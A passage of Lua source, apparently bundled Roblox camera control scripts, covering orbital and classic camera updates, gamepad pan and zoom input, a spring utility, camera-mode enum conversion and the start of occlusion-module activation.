		return self.curDistance
	end
	
	function OrbitalCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
		print("OrbitalCamera SetCameraToSubjectDistance ",desiredSubjectDistance)
		local player = PlayersService.LocalPlayer
		if player then
			self.currentSubjectDistance = math.clamp(desiredSubjectDistance, self.minDistance, self.maxDistance)
	
			-- OrbitalCamera is not allowed to go into the first-person range
			self.currentSubjectDistance = math.max(self.currentSubjectDistance, self.FIRST_PERSON_DISTANCE_THRESHOLD)
		end
		self.inFirstPerson = false
		self:UpdateMouseBehavior()
		return self.currentSubjectDistance
	end
	
	function OrbitalCamera:CalculateNewLookVector(suppliedLookVector, xyRotateVector)
		local currLookVector = suppliedLookVector or self:GetCameraLookVector()
		local currPitchAngle = math.asin(currLookVector.y)
		local yTheta = math.clamp(xyRotateVector.y, currPitchAngle - math.rad(MAX_ALLOWED_ELEVATION_DEG), currPitchAngle - math.rad(MIN_ALLOWED_ELEVATION_DEG))
		local constrainedRotateInput = Vector2.new(xyRotateVector.x, yTheta)
		local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
		local newLookVector = (CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)).lookVector
		return newLookVector
	end
	
	function OrbitalCamera:GetGamepadPan(name, state, input)
		if input.UserInputType == self.activeGamepad and input.KeyCode == Enum.KeyCode.Thumbstick2 then
			if self.r3ButtonDown or self.l3ButtonDown then
			-- R3 or L3 Thumbstick is depressed, right stick controls dolly in/out
				if (input.Position.Y > THUMBSTICK_DEADZONE) then
					self.gamepadDollySpeedMultiplier = 0.96
				elseif (input.Position.Y < -THUMBSTICK_DEADZONE) then
					self.gamepadDollySpeedMultiplier = 1.04
				else
					self.gamepadDollySpeedMultiplier = 1.00
				end
			else
				if state == Enum.UserInputState.Cancel then
					self.gamepadPanningCamera = ZERO_VECTOR2
					return
				end
	
				local inputVector = Vector2.new(input.Position.X, -input.Position.Y)
				if inputVector.magnitude > THUMBSTICK_DEADZONE then
					self.gamepadPanningCamera = Vector2.new(input.Position.X, -input.Position.Y)
				else
					self.gamepadPanningCamera = ZERO_VECTOR2
				end
			end
			return Enum.ContextActionResult.Sink
		end
		return Enum.ContextActionResult.Pass
	end
	
	function OrbitalCamera:DoGamepadZoom(name, state, input)
		if input.UserInputType == self.activeGamepad and (input.KeyCode == Enum.KeyCode.ButtonR3 or input.KeyCode == Enum.KeyCode.ButtonL3) then
			if (state == Enum.UserInputState.Begin) then
				self.r3ButtonDown = input.KeyCode == Enum.KeyCode.ButtonR3
				self.l3ButtonDown = input.KeyCode == Enum.KeyCode.ButtonL3
			elseif (state == Enum.UserInputState.End) then
				if (input.KeyCode == Enum.KeyCode.ButtonR3) then
					self.r3ButtonDown = false
				elseif (input.KeyCode == Enum.KeyCode.ButtonL3) then
					self.l3ButtonDown = false
				end
				if (not self.r3ButtonDown) and (not self.l3ButtonDown) then
					self.gamepadDollySpeedMultiplier = 1.00
				end
			end
			return Enum.ContextActionResult.Sink
		end
		return Enum.ContextActionResult.Pass
	end
	
	function OrbitalCamera:BindGamepadInputActions()
		self:BindAction("OrbitalCamGamepadPan", function(name, state, input) return self:GetGamepadPan(name, state, input) end,
			false, Enum.KeyCode.Thumbstick2)
		self:BindAction("OrbitalCamGamepadZoom", function(name, state, input) return self:DoGamepadZoom(name, state, input) end,
			false, Enum.KeyCode.ButtonR3, Enum.KeyCode.ButtonL3)
	end
	
	
	-- [[ Update ]]--
	function OrbitalCamera:Update(dt)
		local now = tick()
		local timeDelta = (now - self.lastUpdate)
		local userPanningTheCamera = (self.UserPanningTheCamera == true)
		local camera = 	workspace.CurrentCamera
		local newCameraCFrame = camera.CFrame
		local newCameraFocus = camera.Focus
		local player = PlayersService.LocalPlayer
		local cameraSubject = camera and camera.CameraSubject
		local isInVehicle = cameraSubject and cameraSubject:IsA('VehicleSeat')
		local isOnASkateboard = cameraSubject and cameraSubject:IsA('SkateboardPlatform')
	
		if self.lastUpdate == nil or timeDelta > 1 then
			self.lastCameraTransform = nil
		end
	
		if self.lastUpdate then
			local gamepadRotation = self:UpdateGamepad()
	
			if self:ShouldUseVRRotation() then
				self.RotateInput = self.RotateInput + self:GetVRRotationInput()
			else
				-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
				local delta = math.min(0.1, timeDelta)
	
				if gamepadRotation ~= ZERO_VECTOR2 then
					userPanningTheCamera = true
					self.rotateInput = self.rotateInput + (gamepadRotation * delta)
				end
	
				local angle = 0
				if not (isInVehicle or isOnASkateboard) then
					angle = angle + (self.TurningLeft and -120 or 0)
					angle = angle + (self.TurningRight and 120 or 0)
				end
	
				if angle ~= 0 then
					self.rotateInput = self.rotateInput +  Vector2.new(math.rad(angle * delta), 0)
					userPanningTheCamera = true
				end
			end
		end
	
		-- Reset tween speed if user is panning
		if userPanningTheCamera then
			self.lastUserPanCamera = tick()
		end
	
		local subjectPosition = self:GetSubjectPosition()
	
		if subjectPosition and player and camera then
	
			-- Process any dollying being done by gamepad
			-- TODO: Move this
			if self.gamepadDollySpeedMultiplier ~= 1 then
				self:SetCameraToSubjectDistance(self.currentSubjectDistance * self.gamepadDollySpeedMultiplier)
			end
	
			local VREnabled = VRService.VREnabled
			newCameraFocus = VREnabled and self:GetVRFocus(subjectPosition, timeDelta) or CFrame.new(subjectPosition)
	
			local cameraFocusP = newCameraFocus.p
			if VREnabled and not self:IsInFirstPerson() then
				local cameraHeight = self:GetCameraHeight()
				local vecToSubject = (subjectPosition - camera.CFrame.p)
				local distToSubject = vecToSubject.magnitude
	
				-- Only move the camera if it exceeded a maximum distance to the subject in VR
				if distToSubject > self.currentSubjectDistance or self.rotateInput.x ~= 0 then
					local desiredDist = math.min(distToSubject, self.currentSubjectDistance)
	
					-- Note that CalculateNewLookVector is overridden from BaseCamera
					vecToSubject = self:CalculateNewLookVector(vecToSubject.unit * X1_Y0_Z1, Vector2.new(self.rotateInput.x, 0)) * desiredDist
	
					local newPos = cameraFocusP - vecToSubject
					local desiredLookDir = camera.CFrame.lookVector
					if self.rotateInput.x ~= 0 then
						desiredLookDir = vecToSubject
					end
					local lookAt = Vector3.new(newPos.x + desiredLookDir.x, newPos.y, newPos.z + desiredLookDir.z)
					self.RotateInput = ZERO_VECTOR2
	
					newCameraCFrame = CFrame.new(newPos, lookAt) + Vector3.new(0, cameraHeight, 0)
				end
			else
				-- self.RotateInput is a Vector2 of mouse movement deltas since last update
				self.curAzimuthRad = self.curAzimuthRad - self.rotateInput.x
	
				if self.useAzimuthLimits then
					self.curAzimuthRad = math.clamp(self.curAzimuthRad, self.minAzimuthAbsoluteRad, self.maxAzimuthAbsoluteRad)
				else
					self.curAzimuthRad = (self.curAzimuthRad ~= 0) and (math.sign(self.curAzimuthRad) * (math.abs(self.curAzimuthRad) % TAU)) or 0
				end
	
				self.curElevationRad = math.clamp(self.curElevationRad + self.rotateInput.y, self.minElevationRad, self.maxElevationRad)
	
				local cameraPosVector = self.currentSubjectDistance * ( CFrame.fromEulerAnglesYXZ( -self.curElevationRad, self.curAzimuthRad, 0 ) * UNIT_Z )
				local camPos = subjectPosition + cameraPosVector
	
				newCameraCFrame = CFrame.new(camPos, subjectPosition)
	
				self.rotateInput = ZERO_VECTOR2
			end
	
			self.lastCameraTransform = newCameraCFrame
			self.lastCameraFocus = newCameraFocus
			if (isInVehicle or isOnASkateboard) and cameraSubject:IsA('BasePart') then
				self.lastSubjectCFrame = cameraSubject.CFrame
			else
				self.lastSubjectCFrame = nil
			end
		end
	
		self.lastUpdate = now
		return newCameraCFrame, newCameraFocus
	end
	
	return OrbitalCamera
end

function _ClassicCamera()
	
	-- Local private variables and constants
	local ZERO_VECTOR2 = Vector2.new(0,0)
	
	local tweenAcceleration = math.rad(220)		--Radians/Second^2
	local tweenSpeed = math.rad(0)				--Radians/Second
	local tweenMaxSpeed = math.rad(250)			--Radians/Second
	local TIME_BEFORE_AUTO_ROTATE = 2.0 		--Seconds, used when auto-aligning camera with vehicles
	
	local INITIAL_CAMERA_ANGLE = CFrame.fromOrientation(math.rad(-15), 0, 0)
	
	local FFlagUserCameraToggle do
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
		end)
		FFlagUserCameraToggle = success and result
	end
	
	--[[ Services ]]--
	local PlayersService = game:GetService('Players')
	local VRService = game:GetService("VRService")
	
	local CameraInput = _CameraInput()
	local Util = _CameraUtils()
	
	--[[ The Module ]]--
	local BaseCamera = _BaseCamera()
	local ClassicCamera = setmetatable({}, BaseCamera)
	ClassicCamera.__index = ClassicCamera
	
	function ClassicCamera.new()
		local self = setmetatable(BaseCamera.new(), ClassicCamera)
	
		self.isFollowCamera = false
		self.isCameraToggle = false
		self.lastUpdate = tick()
		self.cameraToggleSpring = Util.Spring.new(5, 0)
	
		return self
	end
	
	function ClassicCamera:GetCameraToggleOffset(dt)
		assert(FFlagUserCameraToggle)
	
		if self.isCameraToggle then
			local zoom = self.currentSubjectDistance
	
			if CameraInput.getTogglePan() then
				self.cameraToggleSpring.goal = math.clamp(Util.map(zoom, 0.5, self.FIRST_PERSON_DISTANCE_THRESHOLD, 0, 1), 0, 1)
			else
				self.cameraToggleSpring.goal = 0
			end
	
			local distanceOffset = math.clamp(Util.map(zoom, 0.5, 64, 0, 1), 0, 1) + 1
			return Vector3.new(0, self.cameraToggleSpring:step(dt)*distanceOffset, 0)
		end
	
		return Vector3.new()
	end
	
	-- Movement mode standardized to Enum.ComputerCameraMovementMode values
	function ClassicCamera:SetCameraMovementMode(cameraMovementMode)
		BaseCamera.SetCameraMovementMode(self, cameraMovementMode)
	
		self.isFollowCamera = cameraMovementMode == Enum.ComputerCameraMovementMode.Follow
		self.isCameraToggle = cameraMovementMode == Enum.ComputerCameraMovementMode.CameraToggle
	end
	
	function ClassicCamera:Update()
		local now = tick()
		local timeDelta = now - self.lastUpdate
	
		local camera = workspace.CurrentCamera
		local newCameraCFrame = camera.CFrame
		local newCameraFocus = camera.Focus
	
		local overrideCameraLookVector = nil
		if self.resetCameraAngle then
			local rootPart = self:GetHumanoidRootPart()
			if rootPart then
				overrideCameraLookVector = (rootPart.CFrame * INITIAL_CAMERA_ANGLE).lookVector
			else
				overrideCameraLookVector = INITIAL_CAMERA_ANGLE.lookVector
			end
			self.resetCameraAngle = false
		end
	
		local player = PlayersService.LocalPlayer
		local humanoid = self:GetHumanoid()
		local cameraSubject = camera.CameraSubject
		local isInVehicle = cameraSubject and cameraSubject:IsA('VehicleSeat')
		local isOnASkateboard = cameraSubject and cameraSubject:IsA('SkateboardPlatform')
		local isClimbing = humanoid and humanoid:GetState() == Enum.HumanoidStateType.Climbing
	
		if self.lastUpdate == nil or timeDelta > 1 then
			self.lastCameraTransform = nil
		end
	
		if self.lastUpdate then
			local gamepadRotation = self:UpdateGamepad()
	
			if self:ShouldUseVRRotation() then
				self.rotateInput = self.rotateInput + self:GetVRRotationInput()
			else
				-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
				local delta = math.min(0.1, timeDelta)
	
				if gamepadRotation ~= ZERO_VECTOR2 then
					self.rotateInput = self.rotateInput + (gamepadRotation * delta)
				end
	
				local angle = 0
				if not (isInVehicle or isOnASkateboard) then
					angle = angle + (self.turningLeft and -120 or 0)
					angle = angle + (self.turningRight and 120 or 0)
				end
	
				if angle ~= 0 then
					self.rotateInput = self.rotateInput +  Vector2.new(math.rad(angle * delta), 0)
				end
			end
		end
	
		local cameraHeight = self:GetCameraHeight()
	
		-- Reset tween speed if user is panning
		if self.userPanningTheCamera then
			tweenSpeed = 0
			self.lastUserPanCamera = tick()
		end
	
		local userRecentlyPannedCamera = now - self.lastUserPanCamera < TIME_BEFORE_AUTO_ROTATE
		local subjectPosition = self:GetSubjectPosition()
	
		if subjectPosition and player and camera then
			local zoom = self:GetCameraToSubjectDistance()
			if zoom < 0.5 then
				zoom = 0.5
			end
	
			if self:GetIsMouseLocked() and not self:IsInFirstPerson() then
				-- We need to use the right vector of the camera after rotation, not before
				local newLookCFrame = self:CalculateNewLookCFrame(overrideCameraLookVector)
	
				local offset = self:GetMouseLockOffset()
				local cameraRelativeOffset = offset.X * newLookCFrame.rightVector + offset.Y * newLookCFrame.upVector + offset.Z * newLookCFrame.lookVector
	
				--offset can be NAN, NAN, NAN if newLookVector has only y component
				if Util.IsFiniteVector3(cameraRelativeOffset) then
					subjectPosition = subjectPosition + cameraRelativeOffset
				end
			else
				if not self.userPanningTheCamera and self.lastCameraTransform then
	
					local isInFirstPerson = self:IsInFirstPerson()
	
					if (isInVehicle or isOnASkateboard or (self.isFollowCamera and isClimbing)) and self.lastUpdate and humanoid and humanoid.Torso then
						if isInFirstPerson then
							if self.lastSubjectCFrame and (isInVehicle or isOnASkateboard) and cameraSubject:IsA('BasePart') then
								local y = -Util.GetAngleBetweenXZVectors(self.lastSubjectCFrame.lookVector, cameraSubject.CFrame.lookVector)
								if Util.IsFinite(y) then
									self.rotateInput = self.rotateInput + Vector2.new(y, 0)
								end
								tweenSpeed = 0
							end
						elseif not userRecentlyPannedCamera then
							local forwardVector = humanoid.Torso.CFrame.lookVector
							if isOnASkateboard then
								forwardVector = cameraSubject.CFrame.lookVector
							end
	
							tweenSpeed = math.clamp(tweenSpeed + tweenAcceleration * timeDelta, 0, tweenMaxSpeed)
	
							local percent = math.clamp(tweenSpeed * timeDelta, 0, 1)
							if self:IsInFirstPerson() and not (self.isFollowCamera and self.isClimbing) then
								percent = 1
							end
	
							local y = Util.GetAngleBetweenXZVectors(forwardVector, self:GetCameraLookVector())
							if Util.IsFinite(y) and math.abs(y) > 0.0001 then
								self.rotateInput = self.rotateInput + Vector2.new(y * percent, 0)
							end
						end
	
					elseif self.isFollowCamera and (not (isInFirstPerson or userRecentlyPannedCamera) and not VRService.VREnabled) then
						-- Logic that was unique to the old FollowCamera module
						local lastVec = -(self.lastCameraTransform.p - subjectPosition)
	
						local y = Util.GetAngleBetweenXZVectors(lastVec, self:GetCameraLookVector())
	
						-- This cutoff is to decide if the humanoid's angle of movement,
						-- relative to the camera's look vector, is enough that
						-- we want the camera to be following them. The point is to provide
						-- a sizable dead zone to allow more precise forward movements.
						local thetaCutoff = 0.4
	
						-- Check for NaNs
						if Util.IsFinite(y) and math.abs(y) > 0.0001 and math.abs(y) > thetaCutoff * timeDelta then
							self.rotateInput = self.rotateInput + Vector2.new(y, 0)
						end
					end
				end
			end
	
			if not self.isFollowCamera then
				local VREnabled = VRService.VREnabled
	
				if VREnabled then
					newCameraFocus = self:GetVRFocus(subjectPosition, timeDelta)
				else
					newCameraFocus = CFrame.new(subjectPosition)
				end
	
				local cameraFocusP = newCameraFocus.p
				if VREnabled and not self:IsInFirstPerson() then
					local vecToSubject = (subjectPosition - camera.CFrame.p)
					local distToSubject = vecToSubject.magnitude
	
					-- Only move the camera if it exceeded a maximum distance to the subject in VR
					if distToSubject > zoom or self.rotateInput.x ~= 0 then
						local desiredDist = math.min(distToSubject, zoom)
						vecToSubject = self:CalculateNewLookVectorVR() * desiredDist
						local newPos = cameraFocusP - vecToSubject
						local desiredLookDir = camera.CFrame.lookVector
						if self.rotateInput.x ~= 0 then
							desiredLookDir = vecToSubject
						end
						local lookAt = Vector3.new(newPos.x + desiredLookDir.x, newPos.y, newPos.z + desiredLookDir.z)
						self.rotateInput = ZERO_VECTOR2
	
						newCameraCFrame = CFrame.new(newPos, lookAt) + Vector3.new(0, cameraHeight, 0)
					end
				else
					local newLookVector = self:CalculateNewLookVector(overrideCameraLookVector)
					self.rotateInput = ZERO_VECTOR2
					newCameraCFrame = CFrame.new(cameraFocusP - (zoom * newLookVector), cameraFocusP)
				end
			else -- is FollowCamera
				local newLookVector = self:CalculateNewLookVector(overrideCameraLookVector)
				self.rotateInput = ZERO_VECTOR2
	
				if VRService.VREnabled then
					newCameraFocus = self:GetVRFocus(subjectPosition, timeDelta)
				else
					newCameraFocus = CFrame.new(subjectPosition)
				end
				newCameraCFrame = CFrame.new(newCameraFocus.p - (zoom * newLookVector), newCameraFocus.p) + Vector3.new(0, cameraHeight, 0)
			end
	
			if FFlagUserCameraToggle then
				local toggleOffset = self:GetCameraToggleOffset(timeDelta)
				newCameraFocus = newCameraFocus + toggleOffset
				newCameraCFrame = newCameraCFrame + toggleOffset
			end
	
			self.lastCameraTransform = newCameraCFrame
			self.lastCameraFocus = newCameraFocus
			if (isInVehicle or isOnASkateboard) and cameraSubject:IsA('BasePart') then
				self.lastSubjectCFrame = cameraSubject.CFrame
			else
				self.lastSubjectCFrame = nil
			end
		end
	
		self.lastUpdate = now
		return newCameraCFrame, newCameraFocus
	end
	
	function ClassicCamera:EnterFirstPerson()
		self.inFirstPerson = true
		self:UpdateMouseBehavior()
	end
	
	function ClassicCamera:LeaveFirstPerson()
		self.inFirstPerson = false
		self:UpdateMouseBehavior()
	end
	
	return ClassicCamera
end

function _CameraUtils()

	local CameraUtils = {}
	
	local FFlagUserCameraToggle do
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
		end)
		FFlagUserCameraToggle = success and result
	end
	
	local function round(num)
		return math.floor(num + 0.5)
	end
	
	-- Critically damped spring class for fluid motion effects
	local Spring = {} do
		Spring.__index = Spring
	
		-- Initialize to a given undamped frequency and default position
		function Spring.new(freq, pos)
			return setmetatable({
				freq = freq,
				goal = pos,
				pos = pos,
				vel = 0,
			}, Spring)
		end
	
		-- Advance the spring simulation by `dt` seconds
		function Spring:step(dt)
			local f = self.freq*2*math.pi
			local g = self.goal
			local p0 = self.pos
			local v0 = self.vel
	
			local offset = p0 - g
			local decay = math.exp(-f*dt)
	
			local p1 = (offset*(1 + f*dt) + v0*dt)*decay + g
			local v1 = (v0*(1 - f*dt) - offset*(f*f*dt))*decay
	
			self.pos = p1
			self.vel = v1
	
			return p1
		end
	end
	
	CameraUtils.Spring = Spring
	
	-- map a value from one range to another
	function CameraUtils.map(x, inMin, inMax, outMin, outMax)
		return (x - inMin)*(outMax - outMin)/(inMax - inMin) + outMin
	end
	
	-- From TransparencyController
	function CameraUtils.Round(num, places)
		local decimalPivot = 10^places
		return math.floor(num * decimalPivot + 0.5) / decimalPivot
	end
	
	function CameraUtils.IsFinite(val)
		return val == val and val ~= math.huge and val ~= -math.huge
	end
	
	function CameraUtils.IsFiniteVector3(vec3)
		return CameraUtils.IsFinite(vec3.X) and CameraUtils.IsFinite(vec3.Y) and CameraUtils.IsFinite(vec3.Z)
	end
	
	-- Legacy implementation renamed
	function CameraUtils.GetAngleBetweenXZVectors(v1, v2)
		return math.atan2(v2.X*v1.Z-v2.Z*v1.X, v2.X*v1.X+v2.Z*v1.Z)
	end
	
	function  CameraUtils.RotateVectorByAngleAndRound(camLook, rotateAngle, roundAmount)
		if camLook.Magnitude > 0 then
			camLook = camLook.unit
			local currAngle = math.atan2(camLook.z, camLook.x)
			local newAngle = round((math.atan2(camLook.z, camLook.x) + rotateAngle) / roundAmount) * roundAmount
			return newAngle - currAngle
		end
		return 0
	end
	
	-- K is a tunable parameter that changes the shape of the S-curve
	-- the larger K is the more straight/linear the curve gets
	local k = 0.35
	local lowerK = 0.8
	local function SCurveTranform(t)
		t = math.clamp(t, -1, 1)
		if t >= 0 then
			return (k*t) / (k - t + 1)
		end
		return -((lowerK*-t) / (lowerK + t + 1))
	end
	
	local DEADZONE = 0.1
	local function toSCurveSpace(t)
		return (1 + DEADZONE) * (2*math.abs(t) - 1) - DEADZONE
	end
	
	local function fromSCurveSpace(t)
		return t/2 + 0.5
	end
	
	function CameraUtils.GamepadLinearToCurve(thumbstickPosition)
		local function onAxis(axisValue)
			local sign = 1
			if axisValue < 0 then
				sign = -1
			end
			local point = fromSCurveSpace(SCurveTranform(toSCurveSpace(math.abs(axisValue))))
			point = point * sign
			return math.clamp(point, -1, 1)
		end
		return Vector2.new(onAxis(thumbstickPosition.x), onAxis(thumbstickPosition.y))
	end
	
	-- This function converts 4 different, redundant enumeration types to one standard so the values can be compared
	function CameraUtils.ConvertCameraModeEnumToStandard(enumValue)
		if enumValue == Enum.TouchCameraMovementMode.Default then
			return Enum.ComputerCameraMovementMode.Follow
		end
	
		if enumValue == Enum.ComputerCameraMovementMode.Default then
			return Enum.ComputerCameraMovementMode.Classic
		end
	
		if enumValue == Enum.TouchCameraMovementMode.Classic or
			enumValue == Enum.DevTouchCameraMovementMode.Classic or
			enumValue == Enum.DevComputerCameraMovementMode.Classic or
			enumValue == Enum.ComputerCameraMovementMode.Classic then
			return Enum.ComputerCameraMovementMode.Classic
		end
	
		if enumValue == Enum.TouchCameraMovementMode.Follow or
			enumValue == Enum.DevTouchCameraMovementMode.Follow or
			enumValue == Enum.DevComputerCameraMovementMode.Follow or
			enumValue == Enum.ComputerCameraMovementMode.Follow then
			return Enum.ComputerCameraMovementMode.Follow
		end
	
		if enumValue == Enum.TouchCameraMovementMode.Orbital or
			enumValue == Enum.DevTouchCameraMovementMode.Orbital or
			enumValue == Enum.DevComputerCameraMovementMode.Orbital or
			enumValue == Enum.ComputerCameraMovementMode.Orbital then
			return Enum.ComputerCameraMovementMode.Orbital
		end
	
		if FFlagUserCameraToggle then
			if enumValue == Enum.ComputerCameraMovementMode.CameraToggle or
				enumValue == Enum.DevComputerCameraMovementMode.CameraToggle then
				return Enum.ComputerCameraMovementMode.CameraToggle
			end
		end
	
		-- Note: Only the Dev versions of the Enums have UserChoice as an option
		if enumValue == Enum.DevTouchCameraMovementMode.UserChoice or
			enumValue == Enum.DevComputerCameraMovementMode.UserChoice then
			return Enum.DevComputerCameraMovementMode.UserChoice
		end
	
		-- For any unmapped options return Classic camera
		return Enum.ComputerCameraMovementMode.Classic
	end
	
	return CameraUtils
end

function _CameraModule()
	local CameraModule = {}
	CameraModule.__index = CameraModule
	
	local FFlagUserCameraToggle do
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
		end)
		FFlagUserCameraToggle = success and result
	end
	
	local FFlagUserRemoveTheCameraApi do
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserRemoveTheCameraApi")
		end)
		FFlagUserRemoveTheCameraApi = success and result
	end
	
	-- NOTICE: Player property names do not all match their StarterPlayer equivalents,
	-- with the differences noted in the comments on the right
	local PLAYER_CAMERA_PROPERTIES =
	{
		"CameraMinZoomDistance",
		"CameraMaxZoomDistance",
		"CameraMode",
		"DevCameraOcclusionMode",
		"DevComputerCameraMode",			-- Corresponds to StarterPlayer.DevComputerCameraMovementMode
		"DevTouchCameraMode",				-- Corresponds to StarterPlayer.DevTouchCameraMovementMode
	
		-- Character movement mode
		"DevComputerMovementMode",
		"DevTouchMovementMode",
		"DevEnableMouseLock",				-- Corresponds to StarterPlayer.EnableMouseLockOption
	}
	
	local USER_GAME_SETTINGS_PROPERTIES =
	{
		"ComputerCameraMovementMode",
		"ComputerMovementMode",
		"ControlMode",
		"GamepadCameraSensitivity",
		"MouseSensitivity",
		"RotationType",
		"TouchCameraMovementMode",
		"TouchMovementMode",
	}
	
	--[[ Roblox Services ]]--
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local UserGameSettings = UserSettings():GetService("UserGameSettings")
	
	-- Camera math utility library
	local CameraUtils = _CameraUtils()
	
	-- Load Roblox Camera Controller Modules
	local ClassicCamera = _ClassicCamera()
	local OrbitalCamera = _OrbitalCamera()
	local LegacyCamera = _LegacyCamera()
	
	-- Load Roblox Occlusion Modules
	local Invisicam = _Invisicam()
	local Poppercam = _Poppercam()
	
	-- Load the near-field character transparency controller and the mouse lock "shift lock" controller
	local TransparencyController = _TransparencyController()
	local MouseLockController = _MouseLockController()
	
	-- Table of camera controllers that have been instantiated. They are instantiated as they are used.
	local instantiatedCameraControllers = {}
	local instantiatedOcclusionModules = {}
	
	-- Management of which options appear on the Roblox User Settings screen
	do
		local PlayerScripts = Players.LocalPlayer:WaitForChild("PlayerScripts")
	
		PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Default)
		PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Follow)
		PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Classic)
	
		PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Default)
		PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Follow)
		PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Classic)
		if FFlagUserCameraToggle then
			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.CameraToggle)
		end
	end
	
	CameraModule.FFlagUserCameraToggle = FFlagUserCameraToggle
	
	
	function CameraModule.new()
		local self = setmetatable({},CameraModule)
	
		-- Current active controller instances
		self.activeCameraController = nil
		self.activeOcclusionModule = nil
		self.activeTransparencyController = nil
		self.activeMouseLockController = nil
	
		self.currentComputerCameraMovementMode = nil
	
		-- Connections to events
		self.cameraSubjectChangedConn = nil
		self.cameraTypeChangedConn = nil
	
		-- Adds CharacterAdded and CharacterRemoving event handlers for all current players
		for _,player in pairs(Players:GetPlayers()) do
			self:OnPlayerAdded(player)
		end
	
		-- Adds CharacterAdded and CharacterRemoving event handlers for all players who join in the future
		Players.PlayerAdded:Connect(function(player)
			self:OnPlayerAdded(player)
		end)
	
		self.activeTransparencyController = TransparencyController.new()
		self.activeTransparencyController:Enable(true)
	
		if not UserInputService.TouchEnabled then
			self.activeMouseLockController = MouseLockController.new()
			local toggleEvent = self.activeMouseLockController:GetBindableToggleEvent()
			if toggleEvent then
				toggleEvent:Connect(function()
					self:OnMouseLockToggled()
				end)
			end
		end
	
		self:ActivateCameraController(self:GetCameraControlChoice())
		self:ActivateOcclusionModule(Players.LocalPlayer.DevCameraOcclusionMode)
		self:OnCurrentCameraChanged() -- Does initializations and makes first camera controller
		RunService:BindToRenderStep("cameraRenderUpdate", Enum.RenderPriority.Camera.Value, function(dt) self:Update(dt) end)
	
		-- Connect listeners to camera-related properties
		for _, propertyName in pairs(PLAYER_CAMERA_PROPERTIES) do
			Players.LocalPlayer:GetPropertyChangedSignal(propertyName):Connect(function()
				self:OnLocalPlayerCameraPropertyChanged(propertyName)
			end)
		end
	
		for _, propertyName in pairs(USER_GAME_SETTINGS_PROPERTIES) do
			UserGameSettings:GetPropertyChangedSignal(propertyName):Connect(function()
				self:OnUserGameSettingsPropertyChanged(propertyName)
			end)
		end
		game.Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
			self:OnCurrentCameraChanged()
		end)
	
		self.lastInputType = UserInputService:GetLastInputType()
		UserInputService.LastInputTypeChanged:Connect(function(newLastInputType)
			self.lastInputType = newLastInputType
		end)
	
		return self
	end
	
	function CameraModule:GetCameraMovementModeFromSettings()
		local cameraMode = Players.LocalPlayer.CameraMode
	
		-- Lock First Person trumps all other settings and forces ClassicCamera
		if cameraMode == Enum.CameraMode.LockFirstPerson then
			return CameraUtils.ConvertCameraModeEnumToStandard(Enum.ComputerCameraMovementMode.Classic)
		end
	
		local devMode, userMode
		if UserInputService.TouchEnabled then
			devMode = CameraUtils.ConvertCameraModeEnumToStandard(Players.LocalPlayer.DevTouchCameraMode)
			userMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.TouchCameraMovementMode)
		else
			devMode = CameraUtils.ConvertCameraModeEnumToStandard(Players.LocalPlayer.DevComputerCameraMode)
			userMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.ComputerCameraMovementMode)
		end
	
		if devMode == Enum.DevComputerCameraMovementMode.UserChoice then
			-- Developer is allowing user choice, so user setting is respected
			return userMode
		end
	
		return devMode
	end
	
	function CameraModule:ActivateOcclusionModule( occlusionMode )
		local newModuleCreator
		if occlusionMode == Enum.DevCameraOcclusionMode.Zoom then
			newModuleCreator = Poppercam
		elseif occlusionMode == Enum.DevCameraOcclusionMode.Invisicam then
			newModuleCreator = Invisicam
		else
			warn("CameraScript ActivateOcclusionModule called with unsupported mode")
			return
		end
	
		-- First check to see if there is actually a change. If the module being requested is already
		-- the currently-active solution then just make sure it's enabled and exit early
		if self.activeOcclusionModule and self.activeOcclusionModule:GetOcclusionMode() == occlusionMode then
			if not self.activeOcclusionModule:GetEnabled() then
				self.activeOcclusionModule:Enable(true)
			end
			return
		end
	
		-- Save a reference to the current active module (may be nil) so that we can disable it if
		-- we are successful in activating its replacement
		local prevOcclusionModule = self.activeOcclusionModule
	
		-- If there is no active module, see if the one we need has already been instantiated
		self.activeOcclusionModule = instantiatedOcclusionModules[newModuleCreator]
	
		-- If the module was not already instantiated and selected above, instantiate it
		if not self.activeOcclusionModule then
			self.activeOcclusionModule = newModuleCreator.new()
			if self.activeOcclusionModule then
				instantiatedOcclusionModules[newModuleCreator] = self.activeOcclusionModule
			end
		end
	
		-- If we were successful in either selecting or instantiating the module,
		-- enable it if it's not already the currently-active enabled module
		if self.activeOcclusionModule then
			local newModuleOcclusionMode = self.activeOcclusionModule:GetOcclusionMode()
			-- Sanity check that the module we selected or instantiated actually supports the desired occlusionMode
			if newModuleOcclusionMode ~= occlusionMode then
				warn("CameraScript ActivateOcclusionModule mismatch: ",self.activeOcclusionModule:GetOcclusionMode(),"~=",occlusionMode)
			end
	
			-- Deactivate current module if there is one
			if prevOcclusionModule then
				-- Sanity check that current module is not being replaced by itself (that should have been handled above)
				if prevOcclusionModule ~= self.activeOcclusionModule then
					prevOcclusionModule:Enable(false)
				else
					warn("CameraScript ActivateOcclusionModule failure to detect already running correct module")
				end
			end
	
			-- Occlusion modules need to be initialized with information about characters and cameraSubject
			-- Invisicam needs the LocalPlayer's character
			-- Poppercam needs all player characters and the camera subject
